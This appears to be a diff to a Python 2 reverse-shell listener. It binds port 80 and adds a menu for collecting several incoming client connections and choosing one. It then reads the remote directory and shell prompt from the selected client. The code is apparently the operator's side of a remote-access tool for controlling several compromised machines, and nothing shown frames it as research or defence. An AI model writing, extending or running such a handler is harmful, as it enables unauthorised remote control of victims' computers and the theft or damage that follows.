@@ -13,8 +13,54 @@ server_sock = socket.socket()
 server_sock.bind(("0.0.0.0",80))
 server_sock.listen(5)
 
+print "Listening for client."
 
-comm_socket, addr = server_sock.accept()
+def print_clients(clients):
+	try:
+		os.system('cls' if os.name == 'nt' else 'clear')
+		print("Listening for clients...")
+		print("*-----*")
+		if not clients:
+			print(" ")
+		else:
+			for i, sock in enumerate(clients):
+				print("["+str(i+1)+"]: "+str(clients[i][0])+":"+str(clients[i][1]))
+		print("*-----*")
+		print("Press Ctrl-C to select client.")
+	except KeyboardInterrupt:
+		return
+		
+def get_client():
+	server_sock.settimeout(1)
+	clientsocks = []
+	clientaddrs = []
+	while True:
+		print_clients(clientaddrs)
+		try:
+			try:
+				s, a = server_sock.accept()
+				clientsocks.append(s)
+				clientaddrs.append(a)
+			except socket.timeout:
+				continue
+		except KeyboardInterrupt:
+			os.system('cls' if os.name == 'nt' else 'clear')
+			print("*-----*")
+			for i, sock in enumerate(clientaddrs):
+				print("["+str(i+1)+"]: "+str(clientaddrs[i][0])+":"+str(clientaddrs[i][1]))
+			print(" \n[0]: Exit")
+			print("*-----*")
+			selected = raw_input("[?]Input number of selected sock: ")
+			if selected == "0":
+				os._exit(0)
+			s = clientsocks[int(selected)-1]
+			a = clientaddrs[int(selected)-1][0]
+			clientsocks = []
+			clientaddrs = []
+			return s, a
+
+comm_socket, addr = get_client()
+comm_socket.setblocking(1)
 sys.stdout.write(comm_socket.recv(4096)[:-1]) # Receive current directory and prompt
 
 output_queue = Queue.Queue()
